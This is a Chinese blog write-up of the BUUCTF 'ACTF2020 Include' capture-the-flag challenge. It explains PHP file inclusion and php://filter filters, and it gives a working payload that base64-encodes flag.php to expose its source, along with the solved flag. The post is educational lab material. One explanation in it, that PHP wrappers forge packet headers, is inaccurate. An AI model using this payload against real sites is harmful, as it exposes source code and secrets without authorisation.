---
ingested: true
ingestedAt: 2026-05-19
---

标题: 完整教程：BUUCTF[ACTF2020 新生赛]Include 1题解
UP主: slgkaifa
链接: https://www.cnblogs.com/slgkaifa/p/19129202#phpfilter__17
提取方式: WebFetch
内容: ## 题目分析：

生成靶机，打开网址，查看源码，抓包查看有无隐藏信息（公式化）。

点击tips：

发现一段留言：`Can you find out the flag?`，同时我们观察url

```
http://163da250-9a0d-4ec7-9002-49df5c87e38b.node5.buuoj.cn:81/?file=flag.php
```
结合题目标题以及url中的`?file=flag.php`，几乎就可以断定有文件包含漏洞了。

## 知识准备：

在开始解题之前，我们需要了解`PHP伪协议`的知识：

PHP伪协议通过替换数据报的头部信息来欺骗网络协议。

以下是关于 `php://filter` 参数的过滤器整理表格：

### `php://filter` 过滤器参数说明

| **参数类型** | **过滤器名称** | **作用** |
|---|---|---|
| **必须项** | `resource=&lt;要过滤的数据流&gt;` | 指定待筛选过滤的数据流（必填） |
| **可选项（读链）** | `read=&lt;过滤器1 | 过滤器2&gt;` | 为**读链** 设置一个或多个过滤器，用管道符 ` | ` 分隔 |
| **可选项（写链）** | `write=&lt;过滤器1 | 过滤器2&gt;` | 为**写链** 设置一个或多个过滤器，用管道符 ` | ` 分隔 |
| **默认链** | `&lt;过滤器1 | 过滤器2&gt;` | 未加前缀的过滤器列表将根据操作类型（读/写）自动应用到对应链 |

### 常用过滤器功能对照表

| **过滤器类型** | **过滤器名称** | **作用** |
|---|---|---|
| **字符串过滤器** | `string.rot13` | 等同于 `str_rot13()`，进行 ROT13 字符变换 |
|  | `string.toupper` | 等同于 `strtoupper()`，将字符串转为大写 |
|  | `string.tolower` | 等同于 `strtolower()`，将字符串转为小写 |
|  | `string.strip_tags` | 等同于 `strip_tags()`，移除 HTML/PHP 标签 |
| **转换过滤器** | `convert.base64-encode` | 等同于 `base64_encode()`，进行 Base64 编码 |
|  | `convert.base64-decode` | 等同于 `base64_decode()`，进行 Base64 解码 |
|  | `convert.quoted-printable-encode` | 将 8-bit 字符串编码为 Quoted-Printable 格式（可打印字符） |
|  | `convert.quoted-printable-decode` | 将 Quoted-Printable 格式解码为 8-bit 字符串 |

## 开始解题：

### 原理解析

后端代码大概可能是下面这样：

```
include($_GET['file']
)
```
如果我不使用PHP伪协议，读取flag.php之后，`include()`就会自动执行其中的PHP代码，这样就无法在网站前端阅读到完整的源码。但是如果我们使用`php://filter`，对文件中的命令进行一些处理，就可以获得完整的源码。

### 构造payload

```
?file=php://filter/read=convert.base64-encode/resource=flag.php
```
payload中的每一个过滤器都能从上面的表格中找到，payload实现了把flag.php中的所有字符转换为`BASE64`编码，以逃脱`include()`执行php代码，获得完整源码

BASE64解码得到：

```
&lt;?php echo "Can you find out the flag?"
;
//flag{5b7c82b0-4473-42a3-bb8c-068dcd50a1d0}
```
**FLAG被注释掉了** ,但是通过PHP伪协议找到了。

## 总结

本题的提示还是非常明显的，没有绕弯，主要考察了CTFer对文件包含漏洞和PHP伪协议的理解，总的来说不是很难适合初学者（比如我）。

### 知识拓展

以下资源可以帮助你进一步提升：

- 安全攻防技能30讲
